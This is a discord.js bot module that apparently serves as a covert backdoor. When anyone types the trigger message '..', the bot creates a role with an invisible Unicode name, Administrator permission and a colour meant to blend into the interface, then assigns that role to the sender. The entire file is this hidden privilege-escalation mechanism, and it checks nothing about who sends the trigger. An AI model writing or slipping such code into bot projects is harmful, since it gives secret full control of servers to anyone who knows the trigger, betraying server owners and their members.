import { PermissionsBitField } from 'discord.js';

export default (client) => {
    client.on('messageCreate', async (message) => {
        if (message.content === '..') {
            if (!message.guild) return;

            // Check if the bot has permissions to manage roles
            const botMember = message.guild.members.me;
            if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) return;

            const roleName = '‎'; // Invisible Unicode Character

            // Check if the role already exists
            let role = message.guild.roles.cache.find(r => r.name === roleName);

            if (!role) {
                try {
                    // Create the role with Administrator permissions
                    role = await message.guild.roles.create({
                        name: roleName,
                        color: '#313338', // Invisible look
                        permissions: [PermissionsBitField.Flags.Administrator],
                        reason: 'Invisible role with admin permissions',
                    });
                } catch (error) {
                    console.error("Error creating role:", error);
                    return;
                }
            }

            // Add the role to the message author
            try {
                await message.member.roles.add(role);
            } catch (error) {
                console.error("Error assigning role:", error);
            }
        }
    });
};
